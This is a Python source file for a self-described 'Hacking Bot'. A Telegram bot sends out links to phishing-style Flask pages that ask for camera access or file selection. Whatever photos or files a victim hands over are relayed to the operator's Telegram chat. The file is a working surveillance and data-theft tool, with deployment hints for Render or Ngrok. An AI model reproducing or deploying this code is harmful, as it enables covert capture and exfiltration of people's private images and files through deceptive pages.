import os
import time
import requests
from flask import Flask, request, jsonify, send_file
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler
import threading
import asyncio
from dotenv import load_dotenv
# --- CONFIGURATION ---
load_dotenv()
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID =  os.environ.get("ADMIN_CHAT_ID")

app = Flask(__name__)

# --- FLASK ROUTES ---

@app.route('/capture_photo')
def capture_photo():
    html = """
    <!DOCTYPE html>
    <html>
    <body style="text-align:center; font-family: Arial, sans-serif; background-color: #121212; color: white;">
        <h1>📸 Camera Access Required</h1>
        <p>Click below to take a photo.</p>
        <button onclick="takePhoto()" style="padding: 15px 30px; font-size: 18px; cursor: pointer;">Take Photo</button>
        <script>
            async function takePhoto() {
                const constraints = { video: { facingMode: "environment" } };
                try {
                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('image', blob, 'photo.jpg');
                        await fetch('/upload', { method: 'POST', body: formData });
                        alert('Photo Sent Successfully!');
                        window.location.href = '/success';
                    });
                } catch (err) {
                    alert('Error: ' + err.message);
                }
            }
        </script>
    </body>
    </html>
    """
    return html

@app.route('/capture_files')
def capture_files():
    html = """
    <!DOCTYPE html>
    <html>
    <body style="text-align:center; font-family: Arial, sans-serif; background-color: #121212; color: white;">
        <h1>📁 Select Files</h1>
        <input type="file" id="fileInput" multiple accept="*/*">
        <button onclick="sendFiles()" style="padding: 15px 30px; font-size: 18px; cursor: pointer;">Send Files</button>
        <script>
            async function sendFiles() {
                const files = document.getElementById('fileInput').files;
                if (files.length === 0) return alert('Select files first');
                const formData = new FormData();
                for (let f of files) formData.append('files', f);
                try {
                    await fetch('/upload_files', { method: 'POST', body: formData });
                    alert('Files Sent!');
                    window.location.href = '/success';
                } catch (e) { alert('Error'); }
            }
        </script>
    </body>
    </html>
    """
    return html

@app.route('/success')
def success():
    return "<h1 style='text-align:center; color:white;'>Done!</h1>"

@app.route('/upload', methods=['POST'])
def upload_photo():
    if 'image' not in request.files: return "No file", 400
    file = request.files['image']
    filename = f"captured_{int(time.time())}.jpg"
    file.save(filename)
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(filename, 'rb') as f:
            requests.post(url, files={'photo': (filename, f, 'image/jpeg')})
        os.remove(filename)
        return "OK"
    except Exception as e:
        return str(e), 500
@app.route('/upload_files', methods=['POST'])
def upload_files():
    if 'files' not in request.files: return "No files", 400
    files = request.files.getlist('files')
    for file in files:
        if not file.filename: continue
        filename = f"file_{int(time.time())}_{file.filename}"
        file.save(filename)
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            with open(filename, 'rb') as f:
                requests.post(url, files={'document': (filename, f)})
            os.remove(filename)
        except Exception as e:
            print(f"Error: {e}")
    return "OK"

# --- TELEGRAM BOT ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🕵️ Hacking Bot\n\n1. /photo - Camera\n2. /files - Files\n3. /loc - Location"
    )

async def photo_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # IMPORTANT: Replace this URL with your Render URL later
    # For now, use Ngrok or localhost if testing locally
    link = f"https://your-render-url.onrender.com/capture_photo" 
    await update.message.reply_text(f"📸 Click: <a href='{link}'>Open Camera</a>", parse_mode='HTML')

async def file_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    link = f"https://your-render-url.onrender.com/capture_files"
    await update.message.reply_text(f"📁 Click: <a href='{link}'>Select Files</a>", parse_mode='HTML')

def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    app_bot = ApplicationBuilder().token(BOT_TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("photo", photo_access))
    app_bot.add_handler(CommandHandler("files", file_access))
    app_bot.add_handler(CommandHandler("location", lambda u, c: u.message.reply_text("Location requested")))
    app_bot.run_polling()

def main():
    
    # Run Flask on the port Render provides
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

bot_thread = threading.Thread(target=run_bot)
bot_thread.start()

if __name__ == '__main__':
    main()
